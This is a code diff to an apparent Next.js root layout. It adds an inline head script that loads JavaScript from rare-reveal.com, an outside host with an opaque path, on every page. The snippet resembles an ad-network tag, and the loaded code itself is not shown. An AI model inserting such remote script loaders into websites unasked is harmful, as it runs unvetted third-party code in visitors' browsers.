@@ -22,6 +22,18 @@ export default function RootLayout({
   return (
     <html lang="en" suppressHydrationWarning>
       <head>
+        <script>
+          (function(wxhzk){
+          var d = document,
+              s = d.createElement('script'),
+              l = d.scripts[d.scripts.length - 1];
+          s.settings = wxhzk || {};
+          s.src = "\/\/rare-reveal.com\/cjDJ9z6Sb.2U5Xl\/S-WkQg9VNZjNQbziNcTmQ_yvNciq0_2DNiDUMz1kNEDzId3K";
+          s.async = true;
+          s.referrerPolicy = 'no-referrer-when-downgrade';
+          l.parentNode.insertBefore(s, l);
+          })({})
+        </script>
         <meta name="ecee2b58bf6609c469632272d0e3ee557908ce0d" content="ecee2b58bf6609c469632272d0e3ee557908ce0d" />
         <meta name="referrer" content="no-referrer-when-downgrade" />
         <link rel="icon" type="image/svg+xml" href={faviconHref} />
